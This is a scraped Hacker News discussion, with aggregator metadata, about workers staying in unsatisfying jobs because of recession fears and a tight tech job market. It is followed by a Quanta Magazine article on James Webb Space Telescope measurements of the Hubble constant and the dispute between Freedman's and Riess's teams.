appropriation of content has been happening for well over a century. See this Supreme Court case from 1918: https://en.wikipedia.org/wiki/International_News_Service_v._... reply tacticalturtle 18 hours agorootparentNo, this is straight plagiarism. Those references to Business Insider were self references that the original BI article made: > A 24-year-old employee working in histology named Amanda, who spoke with Business Insider And > Raymond Lee, the CEO of the career outplacement firm Careerminds told BI. There is no rearranging of facts here - these phrases, and the rest of the article - are copy and pasted. reply dredmorbius 17 hours agorootparentEmail the mods suggesting a link to the original source, and if you feel that the submitted site should be penalised or banned, why. At hn@ycombinator.com reply dang 13 hours agoparentprevThanks - we've updated the top link and banned the other site (https://boredbat.com/american-workers-are-stuck-in-place-bec...). reply throwuxiytayq 20 hours agoprev> “I feel trapped here,” Amanda said. “I’m financially screwed if I leave, and that’s why I don’t, or can’t leave.” This is so common. People are afraid of and unprepared for income and status setbacks. Sometimes you need to take a couple steps back to get back on track. (I’m currently taking a step back and I’m intimately familiar with the uncertainty of it.) reply jokoon 14 hours agoparentI live in France, and financially I'm fine not working, I have a few savings, welfare is enough for me. What is truly problematic is the social isolation, the inactivity, and a feeling of not being included. I could go working any job for 20h per week if it did not feel alienating and so competitive and busy. The work mentality is survival of the fittest on steroids. Work is a binary ingroup or outgroup. People who are out are seen as undeserving and seen as lesser people. That's why people want to keep their job. reply 2-3-7-43-1807 10 hours agorootparentgiven your financial situation, aren't you in a position to trade salary for satisfaction? reply jt2190 19 hours agoparentprevWhat is \"taking a step back\" exactly? Leaving a job that you don't like for one that you do like but pays less? reply mcsniff 18 hours agorootparentIMO, it can also be a philosophical thing. \"What do I want out of my one short life? To spend it toiling away unhappy 90% of the time and spend money trying to be happy the remaining 10% or find something I enjoy doing the majority of the time that can also pay some bills?\" A lot of people are asking themselves these questions, and if you're not -- why not? reply Loughla 17 hours agorootparentI think there has also been a massive shift in the game though. More young people are seeing work as a means to an end instead of a calling. Jobs don't define people like they used to. So, trading your week days for money to do everything you want in the weekends is pretty okay now. Being a company (wo)man is sort of seen as being a class traitor? Maybe that's just because I work with low income college students, though. reply marcuskane2 4 hours agorootparentThere was a period of time (80s-90s) that the American middle class was booming and thriving. Boomers with stable but unfulfilling jobs regretted not following their dreams, and the future looked bright, so they told their millenial kids to chase their passions and the money would follow. Then a generation of millenials collectively got millions of degrees in liberal arts and humanities, but the degrees didn't have any class-signaling power or economic value the way a college degree in 1970 did, so instead of getting cushy careers they ended up in low-paid, low-status unfulfilling jobs, with debt from a useless degree. Gen Z saw that happen and took a more practical view towards college, careers, etc. reply razakel 3 hours agorootparentAnd the stable unfulfilling jobs all went to China. reply johnnyanmac 17 hours agorootparentprevIt could be \"pay cut for different domain\" or \"pay cut for better location but lower CoL\". In a more extreme case you can re-spec to another industry altogether. You may not make anywhere close to what you made in tech, but you have 7 figures in stocks and 6 figures in savings anyway. Money is no longer a worry, why not follow a passion? In addition, it can be non-job motivations. e.g. you take a year off to travel for a bit, or engage in some hobby that you know won't make any income. I wouldn't mind doing some art classes if I ever got to that kind of money to live off of for years. reply thr0w 16 hours agorootparent> better location but lower CoL How does that work? reply johnnyanmac 11 hours agorootparent\"better\" is very subjective and doing a lot of heavy lifting, my apologies. The easy snarky response is \"move from US to EU\". But it can be a personal choice to simply get out of the metropolitan areas in favor of a quieter area, or one with better transportation or less crime or friendlier communities. reply fy20 19 hours agorootparentprevThat's the position I'm in. My current employer has not grown as they sold to me when I joined (they've actually got smaller) and has gone through a big cultural shift that doesn't jibe with me. I've received an offer from a company that seems to have a lot better alignment... But it pays 10% less. Meanwhile my current salary has not kept up with inflation over the past couple of years. reply chasd00 18 hours agoparentprevThis is what’s called the “golden handcuffs “. You want to leave but the current job is pretty good and you likely won’t be able to find something better. reply paxys 18 hours agorootparent\"I want to leave but I have $2.5M worth of RSUs vesting in the next two years\" = golden handcuffs. \"I want to leave but if I do I may not be able to find another job and may not be able to pay rent\" is instead the reality most Americans face. reply charlie0 17 hours agorootparentGolden handcuffs only happen because of lifestyle inflation that prevents you from building F U money. $2.5M is more than enough to retire on. reply marcuskane2 3 hours agorootparent> $2.5M is more than enough to retire on For a single, childless person who wants to live a lower-middle class lifestyle in a low cost of living area, sure. But if you want to live in a decent location, you're looking at needing at least a million just for a house. That leaves 1.5 to generate income, so at a 3% safe withdrawal rate that's $45k per year. After taxes that's now like $35k. And you're not getting health insurance from employer so budget $6k per year for premiums (and be ready to pay out up to $6k per year more if you end up in the hospital). So in the end, you've got something like $20k-$29k per year to live on. That covers groceries, car maintenance/insurance/payments, upkeep on the house, phone, etc sufficiently for one person. But you're probably not joining your friends on their ski vacation or even going out for drinks with them too often. And of course, the whole thing falls apart with a family. The average cost of health insurance for a family of 4 is $24,000 per year. reply charlie0 1 hour agorootparentAh, the type of person to starve because their plate of food doesn't include caviar. reply auntienomen 16 hours agorootparentprevYou can't retire until you get the $2.5M, and your employer isn't going to give it to you if quit early. That's what makes it handcuffs. reply charlie0 1 hour agorootparentVesting period is generally 4 years, so while you're right, 4 years is a very short period of time to wear the cuffs. reply keyle 18 hours agorootparentprevNo, golden handcuffs are when you're in for a massive payout if you stick it. In this case, this person is trapped. So just regular handcuffs. reply fsckboy 17 hours agorootparentThe person is not even trapped. The person is worried about the prospects for the economy and they feel better security staying where they are then moving, a move they'd be completely free to make. reply steve_taylor 7 hours agorootparentprevThat's not quite it. Golden handcuffs refer to financially significant unvested shares or options (e.g. RSUs) that you will forfeit if you leave the company. Some companies include quarterly RSUs as a significant percentage of total comp. They have a vesting schedule of four years, so that at any given time, employees have almost four years of unvested RSUs. (After four years, some RSUs fully vest and more RSUs are added.) No one wants to leave that much money on the table. reply philip1209 16 hours agoprevI’ve heard from some friends at major tech companies that their stock grants are not being renewed as they vest. This is leaving them with sometimes >50% effective pay cuts. And, many are choosing to stay put because they don’t think they have other options. reply windex 16 hours agoprevNot just that, I am tired of wanting to actually work than kowtowing to office rituals like drive to work in rush hour traffic to only then get on teams calls in the open. I am also hearing horror stories of new workplaces being completely obstinate about hierarchy and weird HR rule keeping. In short, many workplaces now have \"ritualistic work\" rather than actual tasks to complete. These aren't small names either. I am guessing that top level executives actually have no work other than aggregate from below and look busy. Looking busy needs minions. reply bix6 20 hours agoprevWhich companies have great training programs and happy lifetime employees? The main one that comes to mind is Costco. reply johnnyanmac 17 hours agoparentPlenty in Asia. But in the west, that's a hard question. Especially since the few that come to mind, like Costco and In n Out, aren't exactly \"lifetime careers\" for most people. Apple came so close. Still very young, but their retention seems better than competitors and they dodged a lot of the layoff stuff the rest did (with caveats. They simply \"did not renew\" contractors). But that came to an end in May. I'd probably need to look up some companies in trades, but my impression is many of those are small businesses as opposed to a corporate career. reply mellow-lake-day 10 hours agorootparentNot TSMC > One big problem is that TSMC has been trying to do things the Taiwanese way, even in the U.S. In Taiwan, TSMC is known for extremely rigorous working conditions, including 12-hour work days that extend into the weekends and calling employees into work in the middle of the night for emergencies. TSMC managers in Taiwan are also known to use harsh treatment and threaten workers with being fired for relatively minor failures. > TSMC quickly learned that such practices won’t work in the U.S. Recent reports indicated that the company’s labor force in Arizona is leaving the new plant over these perceived abuses, and TSMC is struggling to fill those vacancies. TSMC is already heavily dependent on employees brought over from Taiwan, with almost half of its current 2,200 employees in Phoenix coming over as Taiwanese transplants. https://www.tomshardware.com/tech-industry/semiconductors/ts... reply silisili 20 hours agoparentprevAnymore, it's rare to find. UPS used to create lifers because their benefits were so good, including free education and a stipend for an apartment even. That's all gone, I think, as they were paring it back in the late 90s already. And nearly everyone has gotten rid of pensions, sadly. reply ghaff 18 hours agorootparentDefined-benefit pensions stopped making sense for a variety of tax and other reasons--including that to get any benefit you typically needed to stay at a place at least 5 years with 10-20 years to get a big benefit. A benefits friend of mine tells me there are some newer programs that work differently from the traditional ones though they're still not that common as far as I can tell. reply zem 19 hours agoparentprevwhen i interviewed with nvidia they said they aimed to be the kind of company where people stayed forever and worked on long term projects. ultimately the interview process moved too slowly for me (i had been laid off and needed to find and accept another job fast), but i was impressed with everyone i talked to and would believe that that was not just a pitch but actually reflected their values. reply johnnyanmac 17 hours agorootparentI've heard they retained well, and basically took the forefront in both AI and GPU vending in general. That plus the specialized knowledge needed to work with such tech leads me to believe that claim. They'll be stable for decades unless something catastropic (depression level) happens. reply Spastche 20 hours agoparentprevthe only thing I can think of is the military and that's only in some circumstances reply lotsofpulp 20 hours agoparentprevIf you read /r/costco, supposedly the new bosses have changed a lot of things for the worse, especially for the non floor employees. reply randerson 16 hours agoprevThis is a great time for engineers who saved their money during the good times to get together and start a startup. The easy money will come back eventually, and you'll have an MVP to pitch to investors at worst, and a bootstrapped and profitable business at best. reply binary132 15 hours agoparent>the easy money will come back eventually or we see the end of the petrodollar as the global kingpin so maybe not reply OptionOfT 18 hours agoprevAs someone who has been left of couple of months ago, I really feel this. There is very low movement in companies, and this makes it hard to find a new place. I hope to find something soon, but to be honest, unless people start hiring again in larger volumes, it's hard to get into the larger companies. They let go of a lot of people before, and rather hire those again then someone new. After all, those people are known quantities, I'm not. Shameless plug: contact me if you need a Senior Software Engineer. Rust, and a whole other bunch of languages. reply HaZeust 15 hours agoparentIf your resume reflects your attitude of \"Rust, and a whole other bunch of languages\", I might have found your problem. reply nine_zeros 19 hours agoprevTech industry has actually had a recession in jobs but not a recession in earnings. This is a prime example of how our society has become so precarious for the middle class while the rich just keep getting richer. reply tootie 16 hours agoparentThat's not really true and not really a thing. Unemployment in tech is even lower than the general economy. It just stopped being massively overheated. reply ghaff 15 hours agorootparentThe 2010s and early=on in the pandemic were extraordinary for (certain) jobs in tech. The meme of I can quit my job Friday and have a significantly higher-paying job by the end of the next week may not really have been the norm in tech, But it was certainly unheard of with professional jobs, inclusing in engineering, historically unless you were a celebrity of some sort in the field. reply bravetraveler 10 hours agoprevOnly the scared ones, I left/found new. It worked out and I'm so burned out I rub people the wrong way. reply charlie0 18 hours agoprevI'm stuck in place because getting a new job is really hard, or so I hear. reply tmiku 19 hours agoprevNot related to the content of the article, but did anyone notice how those graphs become more saturated when you mouse over? It made me expect an interactive graph but it's just an artifacty jpg. Interesting little flourish. reply debacle 16 hours agoprevThe very first sentence is \"...who are having an increasingly tough time landing a new gig as hiring slows and job boards run dry.\" So is the cause and effect backwards? reply jmyeet 16 hours agoprevThe 2010s was a boom time in tech. Total compensation (\"TC\"), particularly for engineers, went way up. Employers didn't like this. They're not above colluding either. They did it with the Steve Jobs anti-poaching deal too. Businesses made accomodations during the pandemic to stay open. Remote work really took off. Also, TC continued to rise. But then some companies failed and the door opened to what I called Permanent Layoff Culture. Most companies end up laying off 5% of their staff every year. This is really an extension of Corporate America's \"up or out\" culture. The likes of Jack Welch extolled the \"virtues\" of firing the bottom 5-10% every year. If you believe the companies, this is necessary. They over-hired. If so, there was a decade of \"over-hiring\". Why was it fine then? Market conditions changed such that with a wink and a nod companies could effectively collude on lyaoffs to suppress wages. The goal in cutting staff is to spread their work to the remaining employees (ie free labor) and to stop people getting raises (ie reduce labor costs). It's really no different to how one food company will raise their prices and every other one will follow suit. There's no direct collusion. That's price manipulation and it's illegal. It's price leadership. What's the difference? Price leadership is legal. There's just no agreement in a smoke-filled room. Workers afraid to quit? Mission accomplished. They won't be asking for raises. reply prewett 20 hours agoprevAnd now the wheel turns... Two or three years ago everyone was quitting. reply thr0w 16 hours agoparentMy personal favorite article/thread title was \"Employers bow to tech workers in hottest job market since the dot-com era\". Remember that? Good times. reply robotnikman 20 hours agoparentprevJust one part of a cycle that keeps repeating, hopefully. reply thr0w 16 hours agorootparentI have a feeling the party's over for good for software engineers. The industry has had a lot of time to build up abstractions and deliver them via frameworks and SaaS products. Now the market is mature - everyone and their mom is glued to the internet, cozy with their well-worn apps. I'm struggling to think of some new frontier that will require mass quantities of raw skilled labor. At least not in our lifetime. This is the internet boom come to rest. reply coffeecloud 12 hours agorootparentIn 1 year I can stand up a system big enough that it would require 2 engineers to manage its ongoing maintenance, feature requests, bug fixes, 3rd party API updates, etc More software requires more software engineers to maintain it, who then write more software, which then require more engineers to maintain it, on and on and on… reply HaZeust 15 hours agorootparentprevWhat are you even talking about? Something comes around every 3-5 years to replenish the software engineer's existence - this time around it's AI. reply wahnfrieden 18 hours agorootparentprevWealth transfers are resulting in greater accumulation at the top with each pass reply fzeroracer 17 hours agoprevIt's not just the prospects of finding a new job that sucks, it's also that no one can actually afford to start a business. The continual draining of wealth from the lower and middle classes has had a severe effect on the lower and middle class's ability to compete. The only way to actually start a business with some potential degree of success involves being a suck-up to massively wealthy individuals so you can onboard an angel investor for your product. This also generally means gimmicks that appeal to the rich and wealthy. A great example is smart kitchen appliance whose goal is to do something worse than what's already on the market so that they can corner people with dark patterns and subscriptions. reply cryptica 19 hours agoprevSituation is quite ridiculous. People are working jobs they don't like and being low-performers on projects they have little control over while working on side projects that they like (for free) and not able to monetize their high performance on those projects. But no matter how good their side projects become, they cannot monetize them due to monopolizing forces. Earning money nowadays is all about having access to money which comes out of a safe money printer. Yes, I could be doing all this useful stuff which makes 100x better use of my skills than my day job but those things don't pay because I won't be able to find any users for it. I don't have much time for it. I could find users but not users who are hooked to a money printer and can afford to pay. I'm sure most users would love it if they spent 20 minutes trying my side project, however, this is too high of a barrier. The company I work for is already well hooked into a money printer and already has its own users but, unfortunately, I cannot produce my best engineering work there because there is too much legacy code and, understandably, my colleagues are as beaten down as I am over this industry so the will to innovate is severely limited. The best we can provide is stability. I've (unfortunately) learned to perceive software complexity as a friend; in the same way as security consultants perceive hackers, as pharma companies perceive chronic illness and as those who build mouse traps perceive mice. I already got burned badly for innovating at a previous company and experienced politics getting in the way in a mind-bendingly disturbing way so I'm not keen to experience that again! Repeatedly in my career, I have seen the low-performers and outright saboteurs being promoted and the innovators being suppressed so my goal now is to emulate those people and engage in political bs. It's the only way. I'm a little bit older, I have to think about my finances now. I know how money flows through the economy and I just go straight for the jugular straight out of a money printer... Printing leafy, digital monetary goodness straight into my bank account. Oh that feels nice. reply matrix87 18 hours agoparentI used to have the same cynical feeling until I realized that there's very little overlap between the things that are actually cool to work on vs the things that other people need done. And if you prioritize the former over the latter, you're essentially trading off easy money for more stress During the 9-5, the goal is to solve other people's problems. It's not pretty but it's what we're paid to do reply zo1 11 hours agorootparentTotally fair point, work isn't supposed to be fun. It's being paid to do something that provides something of value to the person doing the paying. However, at some point, employers heavily leaned into the whole \"work is fun/rewarding/meaningful\" shtick in order to skimp out on actual tangible compensation. So I'd argue that an informal \"contract\" was made or implied, whereby I agreed that \"job is fun/rewarding\" would form part of my compensation. And that's going away now as people are realizing they were duped. There's only so many free perks, parties and vending machines before you realize \"this place is f-ing toxic, the clients treat us like shit, and my boss really isn't treating me like 'family' and being loyal to me.\" reply johnnyanmac 17 hours agoparentprev> Earning money nowadays is all about having access to money which comes out of a safe money printer. I argue that's always been true. Most of the big tech we know today came from very privileged backgrounds that allowed them to take risks that'd be unthinkable for many of us. drop out of college early, run 2-3 failed business to the ground, being booted out of one company and come back later to the same company as an executive, etc. It takes money (or a lot of your time) to make money, that's always been true. The money it takes these days are just so high. Wish you the best of luck in your endeavors, and I'm sorry you gotta navigate this way. I still have some decades to try and get something I can truly own be sustainable, so I want to at least make use of my youth while I have it. reply eltoxo 16 hours agorootparentWe are also only counting the winners who all took huge risk. Many more took huge risk in the past and lost everything. It strikes me as rather absurd to believe it was better in the past when capital was much harder to come by. Imagine trying to get startup funding in the late 80s when a person with capital could get 9% annualized on a short term US government bill. Good luck with that. reply johnnyanmac 11 hours agorootparent> Many more took huge risk in the past and lost everything. sure, but when you have connections or your own finances in the millions, it's a lot harder to truly lose \"everything\" in the same way a missed rent check can actually cost some working class person their home. They will lose a lot but not be out on the streets per se. Many of these people aren't dumb, they won't use their own money to finance this. It just better helps them get investor money to potentially mismanage. >It strikes me as rather absurd to believe it was better in the past when capital was much harder to come by. it was arguably better for people who had capital to begin with. Money begets money, that's always been true in every time and society. for truly scrappy startups, it varies. You could truly innovate with 2-3 buddies out of your garage and make a multi-million dollar business, \"self made\". Fewer would be chosen, but the line would be lower as well. There's more money flowing, but you also need so much more to get off the ground c. 2024. But you can reasonably chance it an self-publish. I don't think it's objectively better or worse, just different. I argue that if you do need money than it is in fact worse though. reply dgfitz 18 hours agoparentprevI too cared once about technical excellence, and was burned badly. Good code ships, even if it’s dogshit. Works for everyone else, fuck it. reply FencePost12 17 hours agoparentprevSo quit. reply cryptica 10 hours agorootparentWhy? I'm not in it for myself anyway, I have a greater purpose now; to help create to inflation. I just have to get paid more than the value I provide to society. reply outside1234 18 hours agoprevJust like the execs wanted… reply fundad 20 hours agoprev [–] It seems like the employers have a lot to gain by spreading the fear of a recession to make the job market to be more favorable to them. Didn't the Treasury secretary quip “The enemy keeps postponing when the recession’s going to come... They are dying to have a recession. They can’t bear going into next year’s election with the economy the way that it is.” https://www.vanityfair.com/news/2019/07/wilbur-ross-democrat... Wait, that's the former Treasury secretary, they sure knew how to do petty. reply Vaslo 14 hours agoparent [–] “Vanity Fair” lol reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "American workers are reluctant to quit their jobs due to fears of an impending recession, according to labor experts.",
      "The shrinking job market has resulted in a rise of \"stuck\" workers who feel trapped in their current roles, leading to decreased job satisfaction.",
      "With growing recession fears, workers are prioritizing job security over career moves, and hiring is expected to slow down even if monetary policy becomes more lenient."
    ],
    "commentSummary": [
      "Workers are reluctant to leave their jobs due to fears of a recession, resulting in job stagnation.",
      "Employees, particularly in the tech industry, are prioritizing job security, work-life balance, and respectful colleagues over higher pay due to past negative experiences and the current economic climate.",
      "The uncertainty of the job market and cautious hiring practices by companies, including performance-based layoffs, are significant deterrents for employees considering a job change."
    ],
    "points": 157,
    "commentCount": 141,
    "retryCount": 0,
    "time": 1723498616
  },
  {
    "id": 41234964,
    "title": "The Webb Telescope further deepens the Hubble tension controversy in cosmology",
    "originLink": "https://www.quantamagazine.org/the-webb-telescope-further-deepens-the-biggest-controversy-in-cosmology-20240813/",
    "originBody": "The Webb Telescope Further Deepens the Biggest Controversy in Cosmology Read Later Share Copied! Comments Read Later Read Later cosmology The Webb Telescope Further Deepens the Biggest Controversy in Cosmology By Liz Kruesi August 13, 2024 A long-awaited study of the cosmic expansion rate suggests that when it comes to the Hubble tension, cosmologists are still missing something. Read Later Three new measurements using the James Webb Space Telescope have led some to question if the Hubble tension is real. Nico Roper/Quanta Magazine By Liz Kruesi Contributing Writer August 13, 2024 View PDF/Print Mode astronomyastrophysicscosmologyHubble constantJames Webb Space TelescopephysicsAll topics Introduction Nearly a century ago, Edwin Hubble discovered that the universe is getting larger. Modern measurements of how fast it is expanding disagree, however, suggesting that our understanding of the laws of physics might be off. Everyone expected the sharp vision of the James Webb Space Telescope to bring the answer into focus. But a long-awaited analysis of the telescope’s observations released late Monday evening once again gleans conflicting expansion rates from different types of data, while homing in on possible sources of error at the heart of the conflict. Two rival teams have led the effort to measure the cosmic expansion rate, which is known as the Hubble constant, or H0. One of these teams, led by Adam Riess of Johns Hopkins University, has consistently measured H0 to be about 8% higher than the theoretical prediction for how fast space should be expanding, based on the cosmos’s known ingredients and governing equations. This discrepancy, known as the Hubble tension, suggests that the theoretical model of the cosmos might be missing something — some extra ingredient or effect that speeds up cosmic expansion. Such an ingredient could be a clue to a more complete understanding of the universe. Riess and his team released their latest measurement of H0 based on Webb data this spring, getting a value that agrees with their earlier estimates. But for years a rival team led by Wendy Freedman of the University of Chicago has urged caution, arguing that cleaner measurements were needed. Her team’s own measurements of H0 have invariably landed closer than Riess’ to the theoretical prediction, implying that the Hubble tension may not be real. Since the Webb telescope started taking data in 2022, the astrophysics community has awaited Freedman’s multipronged analysis using the telescope’s observations of three types of stars. Now, the results are in: Two types of stars yield H0 estimates that align with the theoretical prediction, while the third — the same type of star Riess uses — matches his team’s higher H0 value. Share this article Copied! Newsletter Get Quanta Magazine delivered to your inbox Subscribe now Recent newsletters Mark Belan for Quanta Magazine Introduction That the three methods disagree “is not telling us about fundamental physics,” Freedman said. “That’s telling us there’s some systematic [error] in one or more of the distance methods.” Freedman’s results have been submitted to The Astrophysical Journal but have not yet undergone formal peer review, where outside researchers anonymously check the data and analysis. Saul Perlmutter, a Nobel Prize-winning cosmologist at the University of California, Berkeley, who was shown the team’s preprint prior to its release, told Quanta that the results suggest “we may have a Hubble tension just within the [star-based] measurements. That’s the tension that we really have to be trying to figure out more than trying to invent new [cosmological] models.” The results come after months of behind-the-scenes drama, as Freedman initially thought her analysis had killed the Hubble tension, only to see it come roaring back to life. “It’s been really … not dull, I’ll put it that way,” she said. That’s business as usual. According to Perlmutter, “The Hubble constant has such a long and glorious tradition of being an impossible decades-long problem.” A Clashing Universe The hard part of gauging cosmic expansion is measuring distances to objects in space. The American astronomer Henrietta Leavitt first uncovered a way to do this in 1912 using pulsating stars called Cepheids. These stars flicker at a rate that relates to (and can therefore reveal) their intrinsic luminosity. Once you know how luminous a Cepheid is, you can compare that to how bright or dim it appears to estimate how far away its galaxy is. Edwin Hubble used Leavitt’s method to measure the distances to a handful of galaxies with Cepheids in them, discovering in 1929 that galaxies farther from us are moving away faster. That means the universe is expanding. Hubble pegged the expansion rate at 500 kilometers per second per megaparsec (km/s/Mpc), meaning that two galaxies separated by 1 Mpc, or about 3.2 million light-years, fly apart at 500 km/s. That was wildly off. The American astronomer Edwin Hubble, discoverer of cosmic expansion, is pictured in 1949 peering into the Schmidt telescope at the Palomar Observatory near San Diego. Courtesy of the Caltech Archives and Special Collections Introduction Measurements of H0 improved as astronomers got better at calibrating the relationship between Cepheids’ pulsation frequency and their luminosity. Still, the whole approach was limited because Cepheids are only so bright. To measure the distance to galaxies across the vastness of the universe, scientists would need a new approach. In the 1970s, researchers started using Cepheids to calibrate the distances to bright supernovas, enabling more accurate measurements of H0. Then as now, two research teams led the way, using supernovas anchored to Cepheids and arriving at disagreeing values of 50 km/s/Mpc and 100 km/s/Mpc. “There was no meeting of minds ever; they were just completely polarized,” said George Efstathiou, an astrophysicist at the University of Cambridge. The 1990 launch of the Hubble Space Telescope gave astronomers a new, crisp view of the universe. Freedman led a multiyear observing campaign using Hubble, and in 2001, she and her colleagues announced an expansion rate of 72 km/s/Mpc, estimating that this was at most 10% off. Riess, who is one of the Nobel Prize-winning discoverers of dark energy, jumped into the cosmic expansion game a few years later. In 2011, his team published an H0 value of 73 with an estimated 3% uncertainty. Soon after this, cosmologists pioneered another method entirely. In 2013, they used the Planck telescope’s observations of light left over from the early universe to determine the detailed shape and composition of the primordial cosmos. They then plugged those ingredients into Einstein’s general theory of relativity and evolved the theoretical model forward nearly 14 billion years to predict the current state of the universe. This extrapolation predicts that the cosmos should currently be expanding at a rate of 67.4 km/s/Mpc, with an uncertainty that’s less than 1%. Riess’ team’s measurement, even as its precision improved, stayed at 73. This higher value implies that galaxies today are flying apart faster than they should be according to theory. The Hubble tension was born. “If it’s a real feature of the universe, then it’s telling us that we’re missing something in the cosmological model,” Riess said. This missing something would be the first new ingredient of the cosmos to be discovered since dark energy. Theorists have speculated about its identity: Perhaps it is an additional form of repulsive energy that lasted for a brief time in the early universe? Or maybe it’s primordial magnetic fields generated during the Big Bang? Or maybe the something that’s missing has more to do with us than the universe. Ways of Seeing Some cosmologists, including Freedman, have suspected that unrecognized errors are to blame for the discrepancy. The most common argument in this vein is that Cepheid stars live in the disks of younger galaxies, in regions crowded with stars, dust and gas. “Even with the exquisite resolution of [Hubble], you don’t see a single Cepheid,” Efstathiou said, “you see it superimposed with other stars.” This congestion complicates brightness measurements. When the house-size Webb telescope launched in December 2021, Riess and his colleagues turned to its powerful infrared camera to pierce the dust in the crowded regions where Cepheids live. They sought to test if crowding has as strong an effect as Freedman and other researchers have claimed. The 6.5-meter segmented mirror of the James Webb Space Telescope underwent tests at NASA’s Goddard Space Flight Center in Greenbelt, Maryland, in 2017, years before its December 2021 launch. Desiree Stover/NASA Introduction When they compared their new numbers to the distances calculated from Hubble telescope data, “we saw phenomenal agreement,” said Gagandeep Anand, a member of the team based at the Space Telescope Science Institute. “That tells us, basically, that the work that has been done with Hubble is still good.” Their latest results with Webb reaffirm the H0 value that they measured with Hubble a few years ago: 73.0, give or take 1.0 km/s/Mpc. Given the crowding concern, though, Freedman had already turned to alternative stars that could serve as distance indicators. These are found in the outskirts of galaxies, far from the madding crowd. One type is “tip-of-the-red-giant-branch,” or TRGB, stars. A red giant is an elderly star with a puffed-up atmosphere that glows brightly in red light. As it ages, a red giant will eventually ignite the helium in its core. At that moment, both the star’s temperature and its brightness suddenly drop off, said Kristen McQuinn, an astronomer at the Space Telescope Science Institute who led a Webb telescope project to calibrate distance measurements with TRGBs. A typical galaxy has many red giants. If you plot the brightness of these stars against their temperatures, you’ll see the point at which their brightness drops off. The population of stars right before the drop is a good distance indicator, because in every galaxy, that population will have a similar spread of luminosities. By comparing the observed brightness of these stellar populations, astronomers can estimate relative distances. (With any method, the physicists must deduce the absolute distance of at least one “anchor” galaxy in order to calibrate the whole scale. For their anchor, Riess, Freedman and other groups use an unusual nearby galaxy whose absolute distance has been determined geometrically through a parallax-like effect.) Using TRGBs as distance indicators is more complex than using Cepheids, however. McQuinn and her colleagues used nine of the Webb telescope’s wavelength filters to understand precisely how their brightness depends on their color. Astronomers are also beginning to turn to a new distance indicator: carbon-rich giant stars that belong to what’s called the J-region asymptotic giant branch (JAGB). These stars also sit away from a galaxy’s bright disk and emit a lot of infrared light. The technology to observe them at great distances wasn’t adequate until the Webb era, said Freedman’s graduate student Abigail Lee. Freedman and her team applied for Webb telescope time to observe TRGBs and JAGBs along with the more established distance indicators, the Cepheids, in 11 galaxies. “I am a strong proponent of different methods,” she said. An Evaporating Solution On March 13, 2024, Freedman, Lee and the rest of their team sat around a table in Chicago to reveal what they had been hiding from themselves. Over the previous months, they had split into three groups. Each was tasked with measuring the distance to the 11 galaxies in their study using one of three methods: Cepheids, TRGBs or JAGBs. The galaxies also hosted the relevant kinds of supernovas, so their distances could calibrate the distances of supernovas in many more galaxies farther away. How fast these farther galaxies are receding from us (which is easily read off from their color) divided by their distances gives H0. The three groups had calculated their distance measurements with a unique random offset added to the data. When they met in person, they removed each of the offsets and compared the results. All three methods gave similar distances, within 3% uncertainty. It was “sort of jaw-dropping,” Freedman said. The team calculated three H0 values, one for each distance indicator. All came within range of the theoretical prediction of 67.4. At that moment, they appeared to have erased the Hubble tension. But when they dug into the analysis to write up the results, they found problems. The JAGB analysis was fine, but the other two were off. The team noticed that there were large error bars on the TRGB measurement. They tried to shrink them by including more TGRBs. But when they did so, they found that the distance to the galaxies was smaller than they first thought. The change yielded a larger H0 value. In the Cepheid analysis, Freedman’s team uncovered an error: In about half the Cepheids, the correction for crowding had been applied twice. Fixing that significantly increased the resulting H0 value. It “brought us more into agreement with Adam [Riess], which ought to make him a little happier,” Freedman said. The Hubble tension was resurrected. Wendy Freedman at the University of Chicago is exploring how Webb telescope observations can be squared with the standard cosmological model. Nancy Wong Introduction But Freedman suspects that the Cepheid-based H0 measurement is not as trustworthy as the others. It is extremely sensitive to assumptions about, for example, the elemental composition of the Cepheids, and each star’s neighborhood. Dust in the galactic disks where Cepheids live can absorb their light and dim them. The Webb’s infrared vision pierces the dust, but astronomers need to know how much dust is absorbing light so they can correct for it. For this, Freedman and her colleagues turned to archival Hubble telescope data, which captures the “dust depth,” but it’s not as high-resolution as Webb data. That added uncertainties in the calculated distances, she said. Another issue surfaced. The 11 galaxies they studied with the Webb telescope are the ones nearest to Earth that host all four relevant objects (JAGBs, TRGBs, Cepheids and the relevant type of supernova). But according to Freedman, the galaxies’ supernovas seemed to be intrinsically brighter than the ones in farther galaxies. This is another puzzle cosmologists have yet to understand, and it also affects the H0 value. “I think this is going to be where we’re really going to all have to focus our attention on in the next few years,” she said. Their paper reports three separate H0 values. The JAGB measurement — the one that was done in a completely blind way, without any subsequent correcting — gives 67.96 km/s/Mpc, give or take 1.71 km/s/Mpc. That’s smack-dab on top of the theoretical prediction, seeming to confirm the standard model of cosmology. TRGBs yield a value of 69.85 with similar error margins. The result also alleviates the Hubble tension. The Cepheid method put the value of H0 higher, at 72.05, but with more subjectivity involved: Different assumptions about the stars’ characteristics caused the value to range from 69 to 73. The high end of the range matches Riess’ measurements; at the low end, the Hubble tension all but goes away. “I don’t think we can just say that the Hubble constant is 73,” Freedman said. “I think this is the first test of the Cepheid distance scale,” meaning that JAGBs and TRGBs are serving as a check on the more established method. “And we’re not getting the same answer when we test the Cepheids. So I think it’s important.” Combining the methods and uncertainties yielded an average H0 value of 69.96 with a 4% uncertainty. That margin of error overlaps with both the theoretical prediction for the cosmic expansion rate and Riess’ team’s higher value. “We don’t yet, I think, have the evidence to unambiguously conclude that there’s a [Hubble] tension,” Freedman said. “I just don’t see it.” “Everything depends on tracking down all of these systematic errors,” Perlmutter said. Tensions and Resolutions The James Webb Space Telescope is also enabling additional ways to measure H0. For instance, astronomers are in the early phases of using how mottled a galaxy looks as a proxy for its distance. The idea is simple: Closer galaxies look clumpier because you can resolve some of their stars, whereas more distant galaxies appear smoother. “It’s basically a way to turn the crowding into a measure of distance,” said Anand, who is involved with this project in addition to his work with Riess. Related: What Might Be Speeding Up the Universe’s Expansion? Standard Model of Cosmology Survives a Telescope’s Surprising Finds Cosmologists Debate How Fast the Universe Is Expanding A different method also offers some hope: A massive cluster of galaxies acts like a warped magnifying glass, bending and magnifying the image of an object behind it and creating multiple images of the same object as its light takes multiple paths. The University of Arizona astronomer Brenda Frye leads a program to observe seven clusters with the Webb telescope. When Frye and her colleagues looked at their first telescope image last year, featuring the massive galaxy cluster G165, “we all just said, ‘What are those three dots that weren’t there before?’” she recalled. The dots were three separate images of the same supernova that had exploded behind the cluster. After repeatedly observing the image, they could calculate the differences between the arrival times of the three lensed supernova images. The time delay is proportional to, and can be used to infer, the Hubble constant. 